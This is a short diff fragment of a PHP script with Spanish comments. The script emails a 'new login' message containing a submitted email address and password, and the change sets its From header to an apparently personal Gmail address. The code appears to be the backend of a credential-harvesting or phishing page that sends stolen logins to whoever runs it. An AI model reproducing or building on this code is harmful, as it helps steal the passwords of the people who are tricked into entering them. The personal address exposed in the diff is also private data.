@@ -11,7 +11,7 @@ $subject = "Nuevo inicio de sesión";
 $body = "Correo electrónico: $email\nContraseña: $password";
 
 // Cabeceras adicionales
-$headers = "From: no-reply@example.com";
+$headers = "From: nahuelmartinez1129@gmail.com";
 
 // Enviar el correo
 if (mail($to, $subject, $body, $headers)) {
